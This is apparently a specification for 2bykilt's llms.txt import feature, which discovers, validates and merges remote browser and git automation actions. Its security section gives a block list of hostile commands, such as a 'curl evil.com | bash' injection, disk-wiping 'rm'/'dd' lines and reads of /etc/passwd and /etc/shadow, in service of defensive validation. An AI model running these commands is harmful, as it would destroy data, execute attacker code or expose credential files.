# llms.txt Import Feature Specification

## Overview

The llms.txt import feature enables automatic discovery, validation, and import of browser automation commands from remote `llms.txt` files. This feature allows users to share and reuse automation workflows across different projects and teams while maintaining security and conflict resolution capabilities.

**Feature Status**: ✅ Implemented (Issue #320)

## Motivation

LLMs (Language Learning Models) often need standardized ways to discover and execute browser automation commands. The `llms.txt` convention provides a machine-readable format for publishing automation commands, similar to how `robots.txt` provides instructions for web crawlers.

2bykilt's implementation goes beyond simple discovery by adding:
- **Security validation**: Prevents execution of dangerous commands
- **Conflict resolution**: Handles naming conflicts when importing actions
- **Backup management**: Automatic backups before modifications
- **Dual interface**: Both GUI and CLI access

## Architecture

### Component Overview

```
┌─────────────────────────────────────────────────────────────┐
│                     User Interface Layer                     │
├──────────────────────┬──────────────────────────────────────┤
│   Gradio UI Tab      │         CLI Interface                │
│  (🌐 llms.txt Import)│  (--import-llms / --preview-llms)    │
└──────────────────────┴──────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                  Handler Functions Layer                     │
│  • discover_and_preview_llmstxt()                           │
│  • preview_merge_llmstxt()                                  │
│  • import_llmstxt_actions()                                 │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌──────────────────┬──────────────────┬──────────────────────┐
│  Discovery       │   Security       │   Merge              │
│  Module          │   Validation     │   Module             │
│                  │   Module         │                      │
│ LlmsTxtSource    │ SecurityValidator│ LlmsTxtMerger        │
│ BykiltSection    │                  │                      │
│ Parser           │                  │                      │
└──────────────────┴──────────────────┴──────────────────────┘
```

### Module Responsibilities

#### 1. Discovery Module (`src/modules/llmstxt_discovery.py`)

**Purpose**: Locate and parse `llms.txt` files from remote URLs

**Key Classes**:
- `LlmsTxtSource`: HTTP client for fetching llms.txt
  - Auto-discovery: Tries `/llms.txt` and `/.well-known/llms.txt`
  - HTTPS enforcement (configurable)
  - Network error handling

- `BykiltSectionParser`: YAML parser for 2bykilt-specific sections
  - Supports `# 2bykilt browser_control` sections
  - Supports `# 2bykilt git_script` sections
  - Handles multiple YAML blocks per section

**Key Functions**:
```python
def discover_and_parse(url: str, https_only: bool = True) -> dict:
    """
    Discover llms.txt from URL and parse 2bykilt sections.
    
    Returns:
        {
            'success': bool,
            'url': str,  # Final resolved URL
            'raw_content': str,  # Full llms.txt content
            'browser_control': list[dict],  # Parsed browser actions
            'git_scripts': list[dict],  # Parsed git script actions
            'error': str  # Only present if success=False
        }
    """
```

**Discovery Flow**:
```
Input URL
    ↓
URL Normalization
    ↓
Try: https://example.com/llms.txt  ← If base URL provided
    ↓ (404)
Try: https://example.com/.well-known/llms.txt
    ↓ (200 OK)
Parse YAML Sections
    ↓
Extract 2bykilt Actions
    ↓
Return Parsed Actions
```

#### 2. Security Validation Module (`src/security/llmstxt_validator.py`)

**Purpose**: Validate remote content before execution

**Key Classes**:
- `SecurityValidator`: Multi-layer security validation
  - URL validation (HTTPS enforcement, domain whitelisting)
  - Action safety checks (dangerous commands, injection patterns)
  - YAML content validation (deserialization attacks)

- `ValidationResult`: Structured validation output
  - `valid: bool` - Overall validation status
  - `errors: list[str]` - Blocking errors
  - `warnings: list[str]` - Non-blocking warnings

**Security Layers**:

1. **URL Validation**
   - HTTPS-only enforcement (configurable)
   - Domain whitelist support
   - Path traversal detection
   - Malformed URL rejection

2. **Action Safety Validation**
   - Dangerous command patterns: `rm -rf`, `dd if=/dev/zero`, etc.
   - Command injection patterns: `$(...)`, backticks, pipes with shell commands
   - Path traversal in git scripts: `../`, absolute paths
   - Type validation for action structures

3. **YAML Content Validation**
   - Python object deserialization detection (`!!python/object`)
   - Excessive anchor usage (DoS prevention)
   - YAML bomb patterns

**Example Validation**:
```python
from src.security.llmstxt_validator import validate_remote_llmstxt

url = "https://example.com/llms.txt"
actions = [...]  # Discovered actions
yaml_content = "..."  # Raw llms.txt content

result = validate_remote_llmstxt(url, actions, yaml_content, https_only=True)

if result.valid:
    print("✅ Validation passed")
    for warning in result.warnings:
        print(f"⚠️  {warning}")
else:
    print("❌ Validation failed")
    for error in result.errors:
        print(f"❌ {error}")
```

#### 3. Merge Module (`src/modules/llmstxt_merger.py`)

**Purpose**: Safely merge remote actions into local `llms.txt`

**Key Classes**:
- `LlmsTxtMerger`: Conflict resolution and merge execution
  - Strategy-based conflict resolution (skip/overwrite/rename)
  - Automatic backup creation
  - Preview mode (dry-run)

- `MergeResult`: Merge operation outcome
  - Statistics (added, skipped, overwritten counts)
  - Backup file path
  - Success status

- `MergePreview`: Preview merge outcome
  - Conflict details
  - Resolution strategy per conflict
  - Statistics without file modification

**Conflict Resolution Strategies**:

| Strategy    | Behavior                                      | Use Case                              |
|-------------|-----------------------------------------------|---------------------------------------|
| `skip`      | Keep existing action, skip new one            | Preserve local customizations         |
| `overwrite` | Replace existing action with new one          | Always use latest from remote source  |
| `rename`    | Add new action with numbered suffix (_2, _3)  | Keep both versions for comparison     |

**Merge Flow**:
```
Import Request
    ↓
Load Existing llms.txt
    ↓
Parse Existing Actions
    ↓
Detect Conflicts (by name + type)
    ↓
Apply Strategy
    ├─ skip      → Keep existing
    ├─ overwrite → Replace with new
    └─ rename    → Add with suffix
    ↓
Create Backup (optional)
    ↓
Write Updated llms.txt
    ↓
Return MergeResult
```

**Example Usage**:
```python
from src.modules.llmstxt_merger import LlmsTxtMerger

# Preview merge
merger = LlmsTxtMerger('llms.txt', strategy='skip')
preview = merger.preview_merge(new_actions)

print(preview.summary())
# Output:
# Would add: 3 actions
# Would skip: 1 action (conflicts)
# Conflicts: 1

# Confirm import
result = merger.merge_actions(new_actions, create_backup=True)
print(result.summary())
# Output:
# ✅ Successfully merged 3 actions
# Backup created: llms.txt.backup.20250108_123456
```

## Usage Guide

### Gradio UI Interface

#### Accessing the Feature

1. Launch 2bykilt: `python bykilt.py`
2. Navigate to **"🌐 llms.txt Import"** tab (Tab ID: 13)

#### Workflow Steps

**Step 1: Discovery** 🔍

1. Enter the llms.txt URL or base URL
   - Direct: `https://example.com/llms.txt`
   - Base: `https://example.com` (auto-discovers `/llms.txt`)
2. Configure HTTPS enforcement (recommended: ON)
3. Click **"🔍 Discover Actions"**

**Output**:
- Success message with action count
- Discovered actions in JSON format
- Security validation status

**Step 2: Security Validation** 🔒

Automatically triggered after discovery:
- ✅ All checks passed: Green checkmark with action count
- ⚠️ Warnings: Yellow warnings (non-blocking)
- ❌ Errors: Red errors (blocks import)

**Step 3: Preview Merge** 👁️

1. Select conflict resolution strategy:
   - **skip**: Preserve existing actions (default, safest)
   - **overwrite**: Replace existing with remote
   - **rename**: Add remote with numbered suffix
2. Click **"👁️ Preview Merge"**

**Output**:
```
Would add: 5 actions
Would skip: 2 actions (conflicts)

Conflict Details:
  - search_product: browser_control → browser_control (skip)
  - login_flow: browser_control → browser_control (skip)
```

**Step 4: Import** ✅

1. Review preview results
2. Confirm strategy is correct
3. Click **"✅ Import Actions"**

**Output**:
```
✅ Import completed!

Successfully merged 5 actions
Skipped 2 actions (conflicts with existing)
Backup created: llms.txt.backup.20250108_143022
```

#### UI Tips

- **Accordion Navigation**: Steps are collapsible; completed steps can be collapsed
- **JSON Preview**: Use "Discovered Actions (JSON)" accordion to inspect raw data
- **Automatic Backup**: Backup files are created in same directory as `llms.txt`
- **Error Recovery**: If import fails, original file is unchanged; restore from backup if needed

### CLI Interface

#### Command Syntax

**Preview Mode** (Dry-Run):
```bash
python bykilt.py --preview-llms <URL> [OPTIONS]
```

**Import Mode**:
```bash
python bykilt.py --import-llms <URL> [OPTIONS]
```

#### Options

| Option              | Type     | Default | Description                                    |
|---------------------|----------|---------|------------------------------------------------|
| `--strategy`        | choice   | `skip`  | Conflict resolution: `skip`, `overwrite`, `rename` |
| `--https-only`      | flag     | `True`  | Only allow HTTPS URLs (enabled by default)     |
| `--no-https-only`   | flag     | -       | Disable HTTPS enforcement (not recommended)    |

#### Examples

**Basic Preview**:
```bash
python bykilt.py --preview-llms https://example.com
```

**Preview with Overwrite Strategy**:
```bash
python bykilt.py --preview-llms https://example.com --strategy overwrite
```

**Import with Skip Strategy** (Default):
```bash
python bykilt.py --import-llms https://example.com
```

**Import with Rename Strategy**:
```bash
python bykilt.py --import-llms https://example.com --strategy rename
```

**Allow HTTP URLs** (Not Recommended):
```bash
python bykilt.py --import-llms http://example.com --no-https-only
```

#### CLI Output Examples

**Success**:
```
🔍 Previewing llms.txt import from: https://example.com
   Strategy: skip
   HTTPS Only: True

✅ Discovery successful!

Source URL: https://example.com/llms.txt
Actions found: 7
  - Browser control: 5
  - Git scripts: 2

============================================================
Merge Preview:
============================================================
Would add: 5 actions
Would skip: 2 actions (conflicts with existing)

Conflicts:
  - search_product: existing browser_control → new browser_control (skip)
  - commit_changes: existing git_script → new git_script (skip)
```

**Error**:
```
📥 Importing llms.txt from: https://invalid-url.com
   Strategy: skip
   HTTPS Only: True

❌ Discovery failed: Connection timeout

❌ Discovery failed or no actions found. Import aborted.
```

## 2bykilt Section Format

### Specification

The llms.txt file uses Markdown headers to organize sections. 2bykilt looks for specific section markers:

```markdown
# 2bykilt browser_control

## action_name
- step1: value1
- step2: value2

## another_action
- step1: value1

# 2bykilt git_script

## script_name
- command: git add .
- command: git commit -m "message"
```

### Section Types

#### 1. Browser Control Actions

**Header**: `# 2bykilt browser_control`

**Action Format**:
```yaml
## action_name
- navigate: https://example.com
- type: input[name="q"] = "search query"
- click: button[type="submit"]
- wait: 2
- screenshot: result.png
```

**Supported Steps**:
- `navigate: <URL>` - Navigate to URL
- `type: <selector> = <value>` - Type text into element
- `click: <selector>` - Click element
- `wait: <seconds>` - Wait for duration
- `screenshot: <filename>` - Take screenshot
- `scroll: <direction>` - Scroll page

#### 2. Git Script Actions

**Header**: `# 2bykilt git_script`

**Action Format**:
```yaml
## script_name
- command: git add .
- command: git commit -m "Update files"
- command: git push origin main
```

**Supported Steps**:
- `command: <git_command>` - Execute git command

### Multiple YAML Blocks

You can include multiple YAML blocks in a single section:

```markdown
# 2bykilt browser_control

## login_flow
- navigate: https://example.com/login
- type: input[name="username"] = "user"
- type: input[name="password"] = "pass"
- click: button[type="submit"]

---

## search_flow
- navigate: https://example.com/search
- type: input[name="q"] = "query"
- click: button.search
```

### Real-World Example

```markdown
# Example Company Automation Commands

This file contains browser automation commands for example.com.

# 2bykilt browser_control

## login_to_dashboard
- navigate: https://example.com/login
- type: input#username = "admin"
- type: input#password = "secret"
- click: button.login-btn
- wait: 2
- screenshot: dashboard.png

## search_products
- navigate: https://example.com/products
- type: input.search-bar = "laptop"
- click: button.search
- wait: 1
- screenshot: results.png

## add_to_cart
- click: button.product-item:first-child
- click: button.add-to-cart
- wait: 1
- click: a.cart-link

# 2bykilt git_script

## commit_changes
- command: git add .
- command: git commit -m "Auto-commit from workflow"

## push_to_remote
- command: git push origin main

# Other sections (ignored by 2bykilt)

## Installation
...
```

## Security Considerations

### Threat Model

**Threats Addressed**:
1. **Malicious Command Injection**: Commands with shell expansion, pipes, or dangerous operations
2. **Deserialization Attacks**: YAML bombs, Python object deserialization
3. **Path Traversal**: Scripts accessing files outside project directory
4. **Man-in-the-Middle**: HTTP interception (mitigated by HTTPS enforcement)

**Threats NOT Addressed**:
- Social engineering (user trusts malicious source)
- Compromised trusted domains (domain whitelist bypass)
- Logic bombs (delayed malicious behavior in legitimate-looking scripts)

### Best Practices

#### For Users

1. **Always Use HTTPS**: Keep `--https-only` enabled (default)
2. **Trust Your Sources**: Only import from domains you control or trust
3. **Review Before Import**: Use `--preview-llms` first
4. **Check Backups**: Verify backup files exist before large imports
5. **Use Skip Strategy Initially**: Test with `--strategy skip` before `overwrite`

#### For Publishers

1. **Use HTTPS**: Host llms.txt on HTTPS-enabled servers
2. **Avoid Dangerous Commands**: No `rm`, `dd`, or shell expansion
3. **Use Relative Paths**: Git scripts should use relative paths
4. **Document Commands**: Add comments explaining action purpose
5. **Version Your llms.txt**: Include version/date in file header

### Dangerous Command Patterns

**Blocked Patterns** (Import will fail):

```bash
# File system destruction
rm -rf /
dd if=/dev/zero of=/dev/sda

# Command injection
$(curl evil.com | bash)
`whoami`
command1 | sh

# Path traversal
cd ../../../../etc
cat /etc/passwd

# Privilege escalation
sudo rm -rf /
chmod 777 /etc/shadow
```

**Warning Patterns** (Import allowed with warning):

```bash
# Absolute paths (may work but not portable)
/usr/local/bin/script.sh

# Parameter defaults with special characters
default: "$(pwd)"
```

## Conflict Resolution Details

### Conflict Detection

A conflict occurs when:
1. Action name matches exactly (case-sensitive)
2. Action type matches (`browser_control` or `git_script`)

Example:
```yaml
# Existing llms.txt
## search_product  ← browser_control
- navigate: https://old.com

# Remote llms.txt
## search_product  ← browser_control (CONFLICT!)
- navigate: https://new.com

## new_action  ← browser_control (NO CONFLICT)
- click: button
```

### Strategy Behavior

#### Skip Strategy (`--strategy skip`)

**Default and safest option**

- **Existing actions**: Preserved exactly
- **New actions without conflicts**: Added
- **New actions with conflicts**: Skipped

**Example**:
```
Before:
  - search_product (existing)
  - login_flow (existing)

Import:
  - search_product (new) ← CONFLICT
  - logout_flow (new)

After:
  - search_product (existing, unchanged)
  - login_flow (existing, unchanged)
  - logout_flow (new, added)
```

#### Overwrite Strategy (`--strategy overwrite`)

**Use when remote source is authoritative**

- **Existing actions**: Replaced if conflict exists
- **New actions without conflicts**: Added
- **New actions with conflicts**: Replace existing

**Example**:
```
Before:
  - search_product (v1)
  - login_flow (v1)

Import:
  - search_product (v2) ← CONFLICT
  - logout_flow (v1)

After:
  - search_product (v2, overwritten)
  - login_flow (v1, unchanged)
  - logout_flow (v1, added)
```

#### Rename Strategy (`--strategy rename`)

**Use when both versions are valuable**

- **Existing actions**: Preserved exactly
- **New actions without conflicts**: Added
- **New actions with conflicts**: Added with numbered suffix

**Example**:
```
Before:
  - search_product (local)
  - login_flow (local)

Import:
  - search_product (remote) ← CONFLICT
  - logout_flow (remote)

After:
  - search_product (local, unchanged)
  - search_product_2 (remote, renamed)
  - login_flow (local, unchanged)
  - logout_flow (remote, added)
```

**Increment Logic**:
- First conflict: `_2`
- Second conflict: `_3`
- Nth conflict: `_N+1`

## Backup Management

### Automatic Backups

**When Created**:
- Every import operation (unless `create_backup=False` in API)
- Before any file modification

**Naming Convention**:
```
llms.txt.backup.YYYYMMDD_HHMMSS

Example:
llms.txt.backup.20250108_143022
```

**Location**: Same directory as `llms.txt`

### Manual Restoration

**From Backup**:
```bash
# List backups
ls -lh llms.txt.backup.*

# Restore specific backup
cp llms.txt.backup.20250108_143022 llms.txt

# Compare with current
diff llms.txt llms.txt.backup.20250108_143022
```

**From Git**:
```bash
# If llms.txt is tracked in git
git diff llms.txt
git checkout -- llms.txt  # Revert to last commit
```

### Backup Retention

**No Automatic Cleanup**: Backups accumulate indefinitely

**Manual Cleanup**:
```bash
# Keep only latest 5 backups
ls -t llms.txt.backup.* | tail -n +6 | xargs rm

# Remove backups older than 30 days
find . -name "llms.txt.backup.*" -mtime +30 -delete
```

## Troubleshooting

### Common Errors

#### "Discovery failed: Connection timeout"

**Cause**: Network connectivity issue or invalid URL

**Solutions**:
1. Check internet connection: `curl -I https://example.com`
2. Verify URL is accessible: Open in browser
3. Check for typos in URL
4. Ensure server is responding (not 404 or 500)

#### "Security validation failed: HTTP URL not allowed"

**Cause**: URL uses `http://` instead of `https://`

**Solutions**:
1. Use HTTPS URL if available
2. If HTTP is required (testing): `--no-https-only` (not recommended for production)

#### "Security validation failed: Dangerous command pattern detected"

**Cause**: Action contains blocked command pattern

**Solutions**:
1. Review action content for dangerous commands
2. Remove or replace dangerous patterns:
   - Replace `rm -rf` with safer alternatives
   - Remove pipe `|` operators with shell commands
   - Use relative paths instead of absolute
3. Contact publisher if you believe it's a false positive

#### "Import failed: Unable to parse YAML"

**Cause**: Malformed YAML syntax in llms.txt

**Solutions**:
1. Validate YAML syntax: `python -c "import yaml; yaml.safe_load(open('llms.txt'))"`
2. Check for:
   - Incorrect indentation
   - Missing colons
   - Unclosed quotes
3. Contact publisher to fix source file

#### "No actions found"

**Cause**: llms.txt exists but contains no 2bykilt sections

**Solutions**:
1. Verify file contains `# 2bykilt browser_control` or `# 2bykilt git_script` headers
2. Check section format matches specification (case-sensitive headers)
3. Ensure YAML blocks are properly indented under `##` action names

### Debug Mode

**Enable Verbose Logging**:
```python
import logging
logging.basicConfig(level=logging.DEBUG)
```

**Check Discovery Details**:
```python
from src.modules.llmstxt_discovery import LlmsTxtSource

source = LlmsTxtSource("https://example.com", https_only=True)
result = source.auto_discover()
print(f"Tried URLs: {result.get('tried_urls', [])}")
print(f"Final URL: {result.get('url')}")
print(f"Content length: {len(result.get('content', ''))}")
```

**Validate Manually**:
```python
from src.security.llmstxt_validator import SecurityValidator

validator = SecurityValidator(https_only=True)
validation = validator.validate_remote_llmstxt(url, actions, yaml_content)

print(f"Valid: {validation.valid}")
print(f"Errors: {validation.errors}")
print(f"Warnings: {validation.warnings}")
```

## API Reference

### Python API

#### Discovery

```python
from src.modules.llmstxt_discovery import discover_and_parse

result = discover_and_parse(
    url="https://example.com",
    https_only=True
)

if result['success']:
    browser_actions = result['browser_control']
    git_scripts = result['git_scripts']
```

#### Validation

```python
from src.security.llmstxt_validator import validate_remote_llmstxt

validation = validate_remote_llmstxt(
    url="https://example.com/llms.txt",
    actions=[...],  # Discovered actions
    yaml_content="...",  # Raw llms.txt content
    https_only=True
)

if validation.valid:
    # Safe to import
    pass
```

#### Merge

```python
from src.modules.llmstxt_merger import LlmsTxtMerger

# Preview
merger = LlmsTxtMerger('llms.txt', strategy='skip')
preview = merger.preview_merge(new_actions)
print(preview.summary())

# Import
result = merger.merge_actions(new_actions, create_backup=True)
if result.success:
    print(f"Backup: {result.backup_path}")
```

## Implementation Notes

### File Structure

```
2bykilt/
├── bykilt.py                              # UI handler functions (lines 848-973, 1543-1634, 3285-3365)
├── src/
│   ├── modules/
│   │   ├── llmstxt_discovery.py          # Discovery and parsing (169 lines)
│   │   └── llmstxt_merger.py             # Merge and conflict resolution (172 lines)
│   └── security/
│       └── llmstxt_validator.py          # Security validation (149 lines)
└── tests/
    ├── modules/
    │   ├── test_llmstxt_discovery.py     # 25 tests
    │   └── test_llmstxt_merger.py        # 31 tests
    ├── security/
    │   └── test_llmstxt_validator.py     # 37 tests
    └── integration/
        └── test_llmstxt_e2e.py           # 13 E2E tests
```

### Test Coverage

| Module                   | Coverage | Tests |
|--------------------------|----------|-------|
| llmstxt_discovery.py     | 88%      | 25    |
| llmstxt_validator.py     | 97%      | 37    |
| llmstxt_merger.py        | 91%      | 31    |
| **Total (Phase 1+2)**    | **92%**  | **93**|

### Performance Characteristics

**Discovery**:
- HTTP requests: 2-3 per URL (base, /llms.txt, /.well-known/llms.txt)
- Typical response: < 1 second for small files (< 100KB)
- Memory: ~2x file size during parsing

**Validation**:
- Regex matching: O(n) where n = action count
- Memory: Minimal (< 1MB for typical files)

**Merge**:
- File I/O: 2 writes (backup + final)
- Complexity: O(n + m) where n = existing actions, m = new actions
- Memory: ~3x file size (original + new + merged)

### Extension Points

**Custom Section Parsers**:
```python
from src.modules.llmstxt_discovery import BykiltSectionParser

# Add new section type
BykiltSectionParser.SECTION_PATTERNS['custom_type'] = r'# 2bykilt custom_type'
```

**Custom Security Rules**:
```python
from src.security.llmstxt_validator import SecurityValidator

class CustomValidator(SecurityValidator):
    def validate_action_safety(self, action):
        result = super().validate_action_safety(action)
        # Add custom validation
        return result
```

## Related Documentation

- [README.md](../../README.md) - Main project documentation
- [CONTRIBUTING.md](../../CONTRIBUTING.md) - Development guidelines
- [Issue #320](https://github.com/your-repo/issues/320) - Original feature request
- [PR #321](https://github.com/your-repo/pull/321) - Phase 1+2 implementation
- [llms.txt Specification](https://llmstxt.org/) - Official llms.txt convention

## Version History

- **v1.0** (2025-01-08): Initial implementation with discovery, validation, and merge
  - Phase 1: Discovery & Parsing
  - Phase 2: Security Validation & Merge
  - Phase 3: UI Integration (Gradio + CLI)
  - Phase 4: Documentation

## Support

For issues, questions, or feature requests:
- Open an issue on GitHub
- Check existing issues for similar problems
- Include llms.txt URL and error messages in bug reports
